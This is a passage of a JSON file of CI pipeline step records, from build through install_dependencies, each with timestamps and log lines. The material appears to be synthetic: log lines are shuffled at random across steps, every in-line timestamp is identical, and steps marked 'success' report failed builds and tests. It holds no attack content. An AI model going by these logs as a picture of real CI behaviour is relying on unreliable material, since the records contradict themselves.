          "Installing webpack@4.0.0",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "\u2713 test completed",
          "\u2713 test completed",
          "Cache hit for key-7359",
          "Step 8/10: Building",
          "Step 4/10: Building",
          "Exception: NullPointerException",
          "[12:00:23] WARN: Deprecated API usage",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-16T12:00:30.304889",
        "finished_at": "2025-12-16T12:00:41.002650",
        "log_lines": [
          "=== Step: build ===",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-3612",
          "WARNING: axios has known vulnerabilities",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_api_health (78ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Installing jest@4.10.0",
          "[12:00:23] INFO: Processing request",
          "Installing express@1.17.0",
          "  PASS: test_cache_hit (70ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "Step 2/10: Building",
          "Cache hit for key-1261",
          "  PASS: test_cache_hit (377ms)",
          "  PASS: test_auth_login (199ms)",
          "Cache hit for key-2581",
          "Installing webpack@4.14.0",
          "Cache hit for key-9557",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_db_connect (87ms)",
          "Artifact uploaded: build.tar.gz (4MB)",
          "  PASS: test_user_create (453ms)",
          "Cache hit for key-7485",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "Cache hit for key-9691",
          "  PASS: test_api_health (224ms)",
          "Cache hit for key-9501",
          "Installing jest@3.6.0",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (24MB)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 10/10: Building",
          "  PASS: test_db_connect (360ms)",
          "  PASS: test_auth_login (304ms)",
          "Step 10/10: Building",
          "Step 8/10: Building",
          "Compiling src/index.js...",
          "FAILED: test_api_health",
          "Step 4/10: Building",
          "Cache hit for key-2362",
          "Cache hit for key-5954",
          "Step 10/10: Building",
          "Cache hit for key-1149",
          "Installing lodash@1.18.0",
          "\u2713 test completed",
          "Installing express@3.8.0",
          "Step 3/10: Building",
          "Cache hit for key-8405",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Step 7/10: Building",
          "Installing prettier@4.2.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "  PASS: test_cache_hit (94ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-9349",
          "Step 10/10: Building",
          "Cache hit for key-9441",
          "\u2713 build completed",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Step 9/10: Building",
          "Cache hit for key-7913",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Installing webpack@4.9.0",
          "\u2713 test completed",
          "\u2713 build completed",
          "Cache hit for key-7641",
          "  PASS: test_user_create (89ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2110",
          "Installing webpack@3.12.0",
          "Step 8/10: Building",
          "\u2717 build failed with exit code 48",
          "Step 10/10: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing axios@2.4.0",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Installing prettier@4.16.0",
          "Installing axios@3.13.0",
          "Compiling src/app.ts...",
          "\u2713 build completed",
          "Installing jest@3.5.0",
          "Cache hit for key-1770",
          "  PASS: test_cache_hit (297ms)",
          "Step 8/10: Building",
          "Installing axios@3.5.0",
          "\u2713 lint completed",
          "[12:00:23] ERROR: Connection failed",
          "\u2713 lint completed",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-12-16T12:00:41.002650",
        "finished_at": "2025-12-16T12:00:51.700411",
        "log_lines": [
          "=== Step: unit_tests ===",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Step 6/10: Building",
          "Artifact uploaded: build.tar.gz (44MB)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Cache hit for key-6108",
          "[12:00:23] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Installing axios@1.12.0",
          "\u2713 test completed",
          "Cache hit for key-3250",
          "WARNING: axios has known vulnerabilities",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Installing eslint@1.10.0",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_auth_login (128ms)",
          "Step 8/10: Building",
          "Step 9/10: Building",
          "\u2713 test completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/index.js...",
          "\u2713 build completed",
          "Installing jest@5.8.0",
          "Compiling src/utils.go...",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "  PASS: test_auth_login (144ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/index.js...",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (37MB)",
          "WARNING: jest has known vulnerabilities",
          "  PASS: test_db_connect (36ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-3738",
          "Cache hit for key-2102",
          "  PASS: test_db_connect (324ms)",
          "Compiling src/main.py...",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Step 9/10: Building",
          "Compiling src/app.ts...",
          "  PASS: test_user_create (20ms)",
          "Artifact uploaded: build.tar.gz (13MB)",
          "\u2713 test completed",
          "\u2713 build completed",
          "Installing react@1.2.0",
          "Step 9/10: Building",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (434ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 lint completed",
          "Installing lodash@2.8.0",
          "Cache hit for key-6777",
          "Compiling src/main.py...",
          "  PASS: test_user_create (268ms)",
          "  PASS: test_db_connect (462ms)",
          "Cache hit for key-6344",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "Compiling src/main.py...",
          "Compiling src/service.java...",
          "Installing axios@1.12.0",
          "  PASS: test_cache_hit (204ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (486ms)",
          "Cache hit for key-2930",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Installing eslint@5.12.0",
          "  PASS: test_auth_login (403ms)",
          "  PASS: test_user_create (58ms)",
          "Installing react@5.10.0",
          "\u2713 lint completed",
          "Step 7/10: Building",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing axios@5.11.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "  PASS: test_api_health (335ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing lodash@1.6.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/utils.go...",
          "Installing prettier@3.13.0",
          "[12:00:23] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_user_create (365ms)",
          "Installing axios@4.14.0",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (481ms)",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (277ms)",
          "Installing axios@1.17.0",
          "Step 6/10: Building",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-4179",
          "Cache hit for key-4023",
          "Cache hit for key-1960",
          "  PASS: test_cache_hit (368ms)",
          "Cache hit for key-9318",
          "FAILED: test_cache_hit",
          "Step 2/10: Building",
          "  PASS: test_cache_hit (328ms)",
          "\u2713 lint completed",
          "  PASS: test_user_create (348ms)",
          "\u2713 lint completed",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-16T12:00:51.700411",
        "finished_at": "2025-12-16T12:00:53.126779",
        "log_lines": [
          "=== Step: checkout ===",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "WARNING: lodash has known vulnerabilities",
          "Cache hit for key-8138",
          "  PASS: test_api_health (359ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-1820",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "  PASS: test_db_connect (463ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-8015",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-6260",
          "Compiling src/main.py...",
          "Compiling src/handler.rs...",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-7226",
          "Installing react@5.8.0",
          "Step 7/10: Building",
          "Cache hit for key-9770",
          "Installing lodash@2.6.0",
          "Installing axios@4.5.0",
          "Artifact uploaded: build.tar.gz (34MB)",
          "Compiling src/service.java...",
          "Cache hit for key-6444",
          "  PASS: test_api_health (292ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Compiling src/service.java...",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (221ms)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Cache hit for key-1633",
          "Step 10/10: Building",
          "Installing react@5.16.0",
          "Cache hit for key-6923",
          "  PASS: test_cache_hit (356ms)",
          "Step 7/10: Building",
          "Compiling src/service.java...",
          "Installing axios@1.1.0",
          "Installing axios@4.6.0",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Step 8/10: Building",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "\u2713 test completed",
          "Step 8/10: Building",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Compiling src/service.java...",
          "  PASS: test_auth_login (458ms)",
          "Compiling src/main.py...",
          "  PASS: test_cache_hit (250ms)",
          "\u2713 test completed",
          "  PASS: test_cache_hit (430ms)",
          "Compiling src/service.java...",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Cache hit for key-3107",
          "[12:00:23] INFO: Processing request",
          "Compiling src/utils.go...",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Compiling src/handler.rs...",
          "Step 7/10: Building",
          "\u2717 build failed with exit code 117",
          "  PASS: test_db_connect (32ms)",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Installing lodash@5.3.0",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Cache hit for key-8269",
          "  PASS: test_cache_hit (386ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_api_health (264ms)",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "Installing axios@3.5.0",
          "WARNING: axios has known vulnerabilities",
          "Exception: TypeError",
          "  PASS: test_api_health (4ms)",
          "Cache hit for key-8739",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Step 8/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (60ms)",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:23] ERROR: Connection failed",
          "Cache hit for key-7055",
          "  PASS: test_db_connect (255ms)",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-2651",
          "[12:00:23] INFO: Processing request",
          "Compiling src/service.java...",
          "Cache hit for key-1294",
          "Step 4/10: Building",
          "Installing lodash@3.6.0",
          "Step 3/10: Building",
          "  PASS: test_cache_hit (302ms)",
          "Compiling src/app.ts...",
          "Installing express@1.12.0",
          "Cache hit for key-4807",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (182ms)",
          "Installing prettier@5.14.0",
          "[12:00:23] WARN: Deprecated API usage",
          "=== Step checkout completed ==="
        ]
      },
      {
        "name": "lint",
        "status": "success",
        "started_at": "2025-12-16T12:00:53.126779",
        "finished_at": "2025-12-16T12:00:56.692699",
        "log_lines": [
          "=== Step: lint ===",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "FAILED: test_api_health",
          "Compiling src/service.java...",
          "Cache hit for key-3265",
          "Step 2/10: Building",
          "  PASS: test_api_health (474ms)",
          "Installing webpack@2.14.0",
          "[12:00:23] INFO: Processing request",
          "Installing axios@1.12.0",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (182ms)",
          "Compiling src/handler.rs...",
          "Compiling src/index.js...",
          "Cache hit for key-4749",
          "Compiling src/utils.go...",
          "Installing axios@2.0.0",
          "WARNING: jest has known vulnerabilities",
          "Compiling src/utils.go...",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Compiling src/main.py...",
          "Cache hit for key-1067",
          "Installing prettier@1.1.0",
          "Installing axios@2.8.0",
          "Installing axios@2.18.0",
          "FAILED: test_cache_hit",
          "Compiling src/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_auth_login (456ms)",
          "[12:00:23] INFO: Processing request",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "Cache hit for key-5944",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Installing jest@3.6.0",
          "[12:00:23] WARN: Deprecated API usage",
          "Cache hit for key-3922",
          "\u2713 test completed",
          "\u2713 build completed",
          "\u2713 build completed",
          "Compiling src/service.java...",
          "Step 5/10: Building",
          "Installing webpack@5.1.0",
          "Installing lodash@4.20.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (48MB)",
          "Cache hit for key-4020",
          "Cache hit for key-5743",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Step 9/10: Building",
          "Cache hit for key-6206",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (248ms)",
          "Installing jest@2.2.0",
          "  PASS: test_api_health (267ms)",
          "  PASS: test_api_health (483ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "[12:00:23] INFO: Processing request",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (39MB)",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-9027",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "Installing lodash@3.15.0",
          "Installing lodash@3.3.0",
          "Cache hit for key-6759",
          "Installing webpack@2.3.0",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Step 8/10: Building",
          "Cache hit for key-3573",
          "Artifact uploaded: build.tar.gz (17MB)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "  PASS: test_db_connect (253ms)",
          "Step 10/10: Building",
          "  PASS: test_api_health (317ms)",
          "[12:00:23] INFO: Processing request",
          "Installing axios@1.12.0",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "Step 5/10: Building",
          "  PASS: test_auth_login (137ms)",
          "Cache hit for key-7437",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "\u2713 test completed",
          "Step 4/10: Building",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Artifact uploaded: build.tar.gz (44MB)",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:23] INFO: Processing request",
          "Installing jest@1.20.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Installing webpack@5.6.0",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Compiling src/index.js...",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (24MB)",
          "  PASS: test_auth_login (77ms)",
          "Step 1/10: Building",
          "Cache hit for key-5069",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-16T12:00:56.692699",
        "finished_at": "2025-12-16T12:00:58.832251",
        "log_lines": [
          "=== Step: restore_cache ===",
          "  PASS: test_api_health (434ms)",
          "Compiling src/main.py...",
          "Cache hit for key-3826",
          "  PASS: test_api_health (151ms)",
          "Compiling src/handler.rs...",
          "Compiling src/utils.go...",
          "  PASS: test_user_create (255ms)",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-4261",
          "Compiling src/utils.go...",
          "Cache hit for key-6771",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 7/10: Building",
          "Cache hit for key-5579",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Installing react@4.20.0",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:23] INFO: Processing request",
          "Exception: NullPointerException",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_api_health (133ms)",
          "Compiling src/utils.go...",
          "WARNING: lodash has known vulnerabilities",
          "WARNING: eslint has known vulnerabilities",
          "Step 5/10: Building",
          "  PASS: test_db_connect (343ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "Step 10/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-3363",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (38MB)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "Installing axios@5.14.0",
          "Cache hit for key-8022",
          "  PASS: test_api_health (354ms)",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "Installing axios@2.12.0",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-6044",
          "Installing prettier@2.5.0",
          "Compiling src/service.java...",
          "\u2717 build failed with exit code 90",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_db_connect (276ms)",
          "Cache hit for key-1943",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing react@1.9.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/app.ts...",
          "Installing webpack@3.20.0",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-5646",
          "Compiling src/index.js...",
          "  PASS: test_db_connect (131ms)",
          "Installing axios@3.11.0",
          "Installing eslint@5.16.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (37MB)",
          "[12:00:23] ERROR: Connection failed",
          "Installing eslint@4.3.0",
          "Installing axios@2.1.0",
          "[12:00:23] INFO: Processing request",
          "Installing axios@2.5.0",
          "\u2713 test completed",
          "\u2713 test completed",
          "  PASS: test_cache_hit (243ms)",
          "Cache hit for key-4217",
          "Step 5/10: Building",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_cache_hit (274ms)",
          "\u2713 build completed",
          "WARNING: axios has known vulnerabilities",
          "Cache hit for key-1080",
          "Installing prettier@2.16.0",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Cache hit for key-2382",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Artifact uploaded: build.tar.gz (32MB)",
          "[12:00:23] ERROR: Connection failed",
          "\u2713 test completed",
          "Step 6/10: Building",
          "Step 3/10: Building",
          "  PASS: test_db_connect (208ms)",
          "Installing prettier@2.9.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Installing webpack@1.8.0",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "Step 2/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (35MB)",
          "Exception: ValueError",
          "Compiling src/main.py...",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 7/10: Building",
          "Cache hit for key-7685",
          "[12:00:23] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (27MB)",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-12-16T12:00:58.832251",
        "finished_at": "2025-12-16T12:01:02.398171",
        "log_lines": [
          "=== Step: type_check ===",
          "Step 6/10: Building",
          "\u2713 test completed",
          "Cache hit for key-8030",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_auth_login (389ms)",
          "Cache hit for key-6662",
          "Step 6/10: Building",
          "Installing eslint@4.18.0",
          "Step 4/10: Building",
          "Step 8/10: Building",
          "Step 3/10: Building",
          "Installing prettier@2.11.0",
          "Installing webpack@3.5.0",
          "\u2713 build completed",
          "Compiling src/handler.rs...",
          "Cache hit for key-8639",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Step 9/10: Building",
          "\u2717 build failed with exit code 91",
          "[12:00:23] INFO: Processing request",
          "  PASS: test_api_health (221ms)",
          "\u2713 build completed",
          "\u2713 test completed",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "  PASS: test_auth_login (69ms)",
          "Cache hit for key-7968",
          "[12:00:23] INFO: Processing request",
          "Installing react@5.1.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Installing prettier@2.0.0",
          "  PASS: test_db_connect (495ms)",
          "  PASS: test_api_health (332ms)",
          "Installing react@5.1.0",
          "Cache hit for key-2189",
          "\u2717 build failed with exit code 64",
          "Step 2/10: Building",
          "[12:00:23] WARN: Deprecated API usage",
          "Step 1/10: Building",
          "\u2713 build completed",
          "\u2713 test completed",
          "  PASS: test_cache_hit (429ms)",
          "  PASS: test_db_connect (41ms)",
          "[12:00:23] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 lint completed",
          "Step 4/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_auth_login (66ms)",
          "Installing prettier@2.17.0",
          "Installing lodash@1.11.0",
          "WARNING: webpack has known vulnerabilities",
          "Cache hit for key-7789",
          "Artifact uploaded: build.tar.gz (10MB)",
          "WARNING: eslint has known vulnerabilities",
          "Step 5/10: Building",
          "Cache hit for key-9564",
          "Compiling src/service.java...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "\u2713 lint completed",
          "Cache hit for key-1590",
          "Step 5/10: Building",
          "Exception: TypeError",
          "Cache hit for key-6866",
          "\u2713 test completed",
          "\u2717 build failed with exit code 48",
          "  PASS: test_db_connect (162ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Compiling src/main.py...",
          "  PASS: test_auth_login (449ms)",
          "Installing lodash@4.10.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing react@4.14.0",
          "Cache hit for key-5581",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Installing lodash@2.14.0",
          "\u2713 lint completed",
          "Installing react@5.3.0",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache hit for key-1536",
          "[12:00:23] WARN: Deprecated API usage",
          "\u2713 lint completed",
          "  PASS: test_user_create (490ms)",
          "\u2713 lint completed",
          "Installing lodash@4.19.0",
          "Installing axios@4.4.0",
          "\u2713 lint completed",
          "Step 6/10: Building",
          "  PASS: test_user_create (53ms)",
          "Step 4/10: Building",
          "Cache hit for key-1976",
          "Step 8/10: Building",
          "Cache hit for key-7353",
          "[12:00:23] INFO: Processing request",
          "Installing react@4.19.0",
          "Exception: TypeError",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Installing lodash@5.3.0",
          "[12:00:23] INFO: Processing request",
          "\u2713 build completed",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact uploaded: build.tar.gz (37MB)",
          "Compiling src/app.ts...",
          "  PASS: test_api_health (215ms)",
          "  PASS: test_db_connect (369ms)",
          "\u2713 test completed",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-16T12:01:02.398171",
        "finished_at": "2025-12-16T12:01:13.095932",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "  PASS: test_auth_login (478ms)",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Compiling src/utils.go...",
          "[12:00:23] INFO: Processing request",
          "Installing axios@1.16.0",
          "  PASS: test_auth_login (209ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-7000",
          "Artifact uploaded: build.tar.gz (32MB)",
          "Cache hit for key-4044",
          "Cache hit for key-3485",
          "Compiling src/index.js...",
          "Installing prettier@2.20.0",
          "Compiling src/utils.go...",
          "\u2713 lint completed",
          "[12:00:23] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "\u2713 test completed",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (40MB)",
          "Installing prettier@4.7.0",
          "  PASS: test_db_connect (267ms)",
          "Cache hit for key-3497",
          "Cache hit for key-5243",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 4/10: Building",
          "\u2713 build completed",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (30MB)",
          "\u2713 build completed",
          "Cache hit for key-6889",
          "Step 7/10: Building",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Cache hit for key-6369",
          "Step 9/10: Building",
          "FAILED: test_auth_login",
          "Installing axios@1.15.0",
          "  PASS: test_user_create (78ms)",
          "  PASS: test_api_health (247ms)",
          "Compiling src/main.py...",
          "  PASS: test_api_health (238ms)",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "\u2713 lint completed",
          "Cache hit for key-3155",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "WARNING: express has known vulnerabilities",
          "Exception: ValueError",
          "\u2713 test completed",
          "Step 2/10: Building",
          "Installing react@4.1.0",
          "\u2713 build completed",
          "  PASS: test_db_connect (360ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Step 10/10: Building",
          "Exception: TypeError",
          "Compiling src/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_auth_login (268ms)",
          "[12:00:23] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "Installing express@5.4.0",
          "  PASS: test_user_create (232ms)",
          "  PASS: test_api_health (336ms)",
          "  PASS: test_auth_login (96ms)",
          "[12:00:23] INFO: Processing request",
          "[12:00:23] WARN: Deprecated API usage",
          "Compiling src/main.py...",
          "Cache hit for key-5018",
          "Installing eslint@3.14.0",
          "  PASS: test_cache_hit (481ms)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Compiling src/handler.rs...",
          "Artifact uploaded: build.tar.gz (41MB)",
          "  PASS: test_auth_login (128ms)",
          "Step 4/10: Building",
          "\u2713 test completed",
          "  PASS: test_auth_login (245ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 1/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/main.py...",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "\u2713 lint completed",
          "Step 10/10: Building",
          "  PASS: test_cache_hit (280ms)",
          "Installing express@5.10.0",
          "  PASS: test_auth_login (174ms)",
          "  PASS: test_db_connect (64ms)",
          "Compiling src/main.py...",
          "  PASS: test_user_create (453ms)",
          "Installing lodash@5.17.0",
          "Cache hit for key-4588",
          "\u2713 lint completed",
          "[12:00:23] INFO: Processing request",
          "Cache hit for key-7130",
          "\u2713 build completed",
          "Step 6/10: Building",
          "\u2713 test completed",
          "\u2713 test completed",
          "FAILED: test_db_connect",
          "Step 5/10: Building",
          "Installing react@5.7.0",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "=== Step install_dependencies completed ==="
        ]
      },
